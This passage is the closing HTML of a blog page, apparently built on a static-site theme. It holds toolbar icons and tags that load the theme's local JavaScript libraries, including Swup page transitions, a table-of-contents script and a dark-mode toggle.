			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>



	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>





    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>








    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>